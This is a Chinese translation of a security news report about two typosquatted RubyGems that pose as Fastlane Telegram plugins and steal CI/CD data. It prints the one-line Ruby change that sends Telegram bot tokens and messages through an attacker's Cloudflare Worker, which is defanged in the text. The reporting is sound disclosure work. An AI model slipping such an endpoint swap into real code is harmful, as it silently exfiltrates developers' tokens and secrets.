---
title: 警报：恶意 RubyGems 冒充 Fastlane 插件，窃取 CI/CD 数据
url: https://www.anquanke.com/post/id/308092
source: 安全客-有思想的安全新媒体
date: 2025-06-05
fetch_date: 2025-10-06T22:49:32.129618
---

# 警报：恶意 RubyGems 冒充 Fastlane 插件，窃取 CI/CD 数据

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 警报：恶意 RubyGems 冒充 Fastlane 插件，窃取 CI/CD 数据

阅读量**153812**

发布时间 : 2025-06-04 15:31:41

**x**

##### 译文声明

本文是翻译文章，文章原作者 Ddos，文章来源：securityonline

原文地址：<https://securityonline.info/alert-malicious-rubygems-impersonate-fastlane-plugins-steal-ci-cd-data/>

译文仅供参考，具体内容表达以及含义原文为准。

![gem]()

Socket的威胁研究团队发现了利用恶意RubyGems冒充Fastlane插件的有针对性的供应链攻击。攻击者利用越南对Telegram变通办法的需求增加,分发从CI / CD管道中秘密窃取敏感部署数据的宝石。

恶意宝石 – fastlane-plugin-telegram-proxy和fastlane-plugin-proxy\_teleram – 由威胁行为者使用越南别名Bùi nam,buidanhnam和si\_mobile发布。这些软件包伪装成 Fastlane 的合法 Telegram 通知工具,Fastlane 是移动应用程序开发中流行的自动化工具。

乍一看,宝石似乎无害。他们：

* ①克隆合法的 fastlane-plugin-telegram 插件,
* ②保留预期的行为和界面,
* ③保存 README 文档,甚至链接到分叉的 GitHub 仓库。

但是,一行代码的微妙切换使它们变得恶意:

```
# Legitimate endpoint
uri = URI.parse("https://api.telegram.org/bot#{token}/sendMessage")

# Malicious version
uri = URI.parse("https://rough-breeze-0c37[.]buidanhnam95[.]workers[.]dev/bot#{token}/sendMessage")
```

*“这种微妙的变化通过威胁行为者的中继重定向了每个Telegram API调用*[,”Socket解释说。](https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban)

威胁行为者的 Cloudflare Worker 代理捕获:

* ①Telegram bot 令牌
* ②聊天 ID 和消息内容
* ③上传文件(例如,日志、工件)
* ④可选代理凭据

*“该插件仍然返回Telegram的有效响应,使行为难以检测*,”Socket指出。这些机器人令牌提供了对受害者Telegram机器人的完全访问权限,使攻击者能够冒充,删除或操纵机器人通信。

Fastlane插件通常在CI/CD管道内运行,处理:

* ①代码签名密钥
* ②释放二进制文件
* ③[Environment](https://securityonline.info/lastpass-your-digital-life-secured-and-simplified-review-recommendation/)环境变量和秘密

*“因为Fastlane运行在处理敏感资产的CI / CD管道中……*因此影响深入到软件构建和发布工作流程中。

后门宝石没有试图限制区域或使用上下文。任何使用该插件的开发人员或团队都是脆弱的——无论地理位置如何。

为了逃避检测并提高搜索可见性,攻击者采用:

* ①Typosquatting(电报而不是电报)
* ②战略使用后缀(-代理)
* ③将分叉的 GitHub 仓库链接为软件包主页

*“RubyGems上快速通道插件远程图的搜索结果显示了与合法插件一起排列的恶意错字标记的宝石。*

![RubyGems,供应链攻击]()、

尽管有明确的恶意意图,但在撰写本文时,这两个宝石仍然可以在RubyGems上使用。

本文翻译自securityonline [原文链接](https://securityonline.info/alert-malicious-rubygems-impersonate-fastlane-plugins-steal-ci-cd-data/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/308092](/post/id/308092)

安全KER - 有思想的安全新媒体

本文转载自: [securityonline](https://securityonline.info/alert-malicious-rubygems-impersonate-fastlane-plugins-steal-ci-cd-data/)

如若转载,请注明出处： <https://securityonline.info/alert-malicious-rubygems-impersonate-fastlane-plugins-steal-ci-cd-data/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [漏洞分析](/tag/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)
* [安全知识](/tag/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86)
* [网络安全](/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8)

**+1**0赞

收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p2.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=170061)

[安全客](/member.html?memberId=170061)

这个人太懒了，签名都懒得写一个

* 文章
* **2096**

* 粉丝
* **6**

### TA的文章

* ##### [英国通过数据访问和使用监管法案](/post/id/308719)

  2025-06-20 17:11:10
* ##### [CISA警告：严重缺陷（CVE-2025-5310）暴露加油站设备](/post/id/308715)

  2025-06-20 17:09:03
* ##### [大多数公司高估了AI治理，因为隐私风险激增](/post/id/308708)

  2025-06-20 17:05:02
* ##### [研究人员发现了有史以来最大的数据泄露事件，暴露了160亿个登录凭证](/post/id/308704)

  2025-06-20 17:02:15
* ##### [CVE-2025-6018和CVE-2025-6019漏洞利用：链接本地特权升级缺陷让攻击者获得大多数Linux发行版的根访问权限](/post/id/308701)

  2025-06-20 16:59:36

### 相关文章

* ##### [论韧性数字安全体系（第十三章）](/post/id/309219)

  2025-07-01 15:03:14
* ##### [无文件 AsyncRAT 活动利用隐蔽的 PowerShell 有效载荷攻击德国用户](/post/id/308562)

  2025-06-18 15:22:31
* ##### [起亚厄瓜多尔无钥匙进入系统漏洞导致数千辆车辆被盗](/post/id/308480)

  2025-06-16 15:48:35
* ##### [微软 Office 漏洞允许攻击者执行远程代码](/post/id/308412)

  2025-06-12 15:43:53
* ##### [美国CISA警告 SinoTrack GPS 跟踪器存在远程控制漏洞](/post/id/308398)

  2025-06-12 15:15:38
* ##### [黑客通过恶意简历瞄准求职者](/post/id/308388)

  2025-06-12 14:31:49
* ##### [微软修补被阿联酋黑客利用的零日漏洞](/post/id/308384)

  2025-06-12 14:28:52

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)